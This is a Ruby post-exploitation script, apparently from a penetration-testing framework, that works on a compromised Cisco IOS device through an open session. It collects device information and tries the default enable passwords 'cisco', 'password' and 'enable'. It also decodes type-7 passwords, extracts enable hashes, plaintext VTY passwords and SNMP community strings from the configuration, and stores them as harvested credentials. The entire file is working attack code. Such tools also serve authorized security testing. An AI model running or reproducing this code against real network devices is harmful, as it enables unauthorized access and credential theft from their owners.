##
# $Id$
##

def cisco_decrypt7(inp)
	xlat = [
		0x64, 0x73, 0x66, 0x64, 0x3b, 0x6b, 0x66, 0x6f,
		0x41, 0x2c, 0x2e, 0x69, 0x79, 0x65, 0x77, 0x72,
		0x6b, 0x6c, 0x64, 0x4a, 0x4b, 0x44, 0x48, 0x53,
		0x55, 0x42
	]
	
	return nil if not inp[0,2] =~ /\d\d/
	
	seed  = nil
	clear = ""
	inp.scan(/../).each do |byte|	
		if not seed
			seed = byte.to_i
			next
		end
		byte = byte.to_i(16)
		clear << [ byte ^ xlat[ seed ]].pack("C")
		seed += 1
	end
	clear
end

#
# Collect various device information from the machine on the other end of the session.
#

print_status("Collecting information from Cisco IOS")

#
# Figure out what service to report credentials to
# XXX: This only handles SSH and Telnet today
session_host, session_port = client.tunnel_peer.to_s.split(":")
session_port ||= 23
session_port = session_port.to_i
service_name = ( session_port == 23 ? "telnet" : "ssh" )

#
# Disabling paging on the terminal
#
print_status("Preparing the IOS terminal...")
output = client.shell_command("terminal length 0")

#
# Clear the incoming buffer
#
print_status("Flushing the terminal buffer...")
client.shell_command("")


#
# Detect the Cisco IOS prompt string
#
prompt = output = client.shell_command("")
print_status("Prompt detected as #{prompt.inspect}")

#
# Get version information
#
cmd = "show version"
output = client.shell_command(cmd)
output = output.to_s.gsub(prompt, "").gsub(cmd, "").strip
if (output.length > 0)
	pro.store_loot("cisco.ios.version", "text/plain", client, output.strip, "version.txt", "Cisco IOS Version")
end

#
# Get location information
#
cmd = "show location"
output = client.shell_command(cmd)
output = output.to_s.gsub(prompt, "").gsub(cmd, "").strip
if (output and output.length > 0)
	pro.store_loot("cisco.ios.location", "text/plain", client, output.strip, "location.txt", "Cisco IOS Location")
end

#
# Get user information
#
cmd = "show users"
output = client.shell_command(cmd)
output = output.to_s.gsub(prompt, "").gsub(cmd, "").strip
if (output and output.length > 0)
	pro.store_loot("cisco.ios.users", "text/plain", client, output.strip, "users.txt", "Cisco IOS Users")
end

#
# Get active connections
#
cmd = "where"
output = client.shell_command(cmd)
output = output.to_s.gsub(prompt, "").gsub(cmd, "").strip
if (output and output.length > 0 and output !~ /No connections open/)
	pro.store_loot("cisco.ios.where", "text/plain", client, output.strip, "where.txt", "Cisco IOS Who")
end


#
# Try to gain access to an enable shell
#
cmd = "enable"
output = client.shell_command(cmd)

enabled = false

passwords = %W{cisco password enable}
password  = nil

if output =~ /Password:/
	
	passwords.each do |attempt|
		r = client.shell_command(attempt)
		if r =~ /Bad secrets/
			break
		end
		if r =~ /Password/
			next
		end
		password = attempt
		enabled  = true
		break
	end
	
	if enabled
		print_good("Gained enable access with password '#{password}'")
	end
else
	print_good("No enable password required")
	enabled = true
end

if not enabled
	print_error("Could not gain enable access")
	raise Rex::Script::Completed
end

#
# Create a template hash for cred reporting
#
cred_info = {
	:host  => session_host,
	:sname => service_name,
	:user  => "",
	:pass  => "",
	:type  => "",
	:collect_type => "",
	:active => true
}

source_user = client.exploit_datastore['USERNAME']
source_pass = client.exploit_datastore['PASSWORD']
cred_info.merge!({
	:collect_user => source_user,
	:collect_pass => source_pass
})
cred_info.merge!(:collect_session => client.sid)


#
# Get configuration file
#
cmd = "show config"
output = client.shell_command(cmd)
output = output.to_s.gsub(prompt, "").gsub(cmd, "").strip
if (output and output.length > 0)
	pro.store_loot("cisco.ios.config", "text/plain", client, output.strip, "config.txt", "Cisco IOS Configuration")
end

output.to_s.each_line do |line|
	case line
		when /^\s*enable secret (\d+) (.*)/i
			stype = $1.to_i
			shash = $2.strip
			
			if stype == 5
				print_good("MD5 Encrypted Enable Password: #{shash}")
				pro.store_loot("cisco.ios.enable_hash", "text/plain", client, shash, "enable_password_hash.txt", "Cisco IOS Enable Password Hash (MD5)")
			end

			if stype == 7
				shash = cisco_decrypt7(shash) rescue shash
				print_good("Decrypted Enable Password: #{shash}")
				pro.store_loot("cisco.ios.enable_pass", "text/plain", client, shash, "enable_password.txt", "Cisco IOS Enable Password")
				
				cred = cred_info.dup
				cred[:pass] = shash
				cred[:type] = "cisco_enable"
				cred[:collect_type] = "cisco_enable"
				pro.store_cred(cred)		
			end		
				
		when /^\s*enable password (.*)/i
			spass = $1.strip
			print_good("Unencrypted Enable Password: #{spass}")
			
			cred = cred_info.dup
			cred[:pass] = spass
			cred[:type] = "cisco_enable"
			cred[:collect_type] = "cisco_enable"
			pro.store_cred(cred)
						
		when /\s*snmp-server community ([^\s]+) (RO|RW)/i
			stype = $2.strip
			scomm = $1.strip
			print_good("SNMP Community (#{stype}): #{scomm}")
			
			cred = cred_info.dup
			cred[:sname] = "snmp"
			cred[:pass] = scomm
			cred[:type] = "password"
			cred[:collect_type] = "password"
			cred[:proto] = "udp"
			cred[:port]  = 161
			pro.store_cred(cred)	
					
		when /\s*password ([^\s]+)/i
			spass = $1.strip
			print_good("Unencrypted VTY Password: #{spass}")
			cred = cred_info.dup
			cred[:pass] = spass
			cred[:type] = "password"
			cred[:collect_type] = "password"
			pro.store_cred(cred)			
	end
end

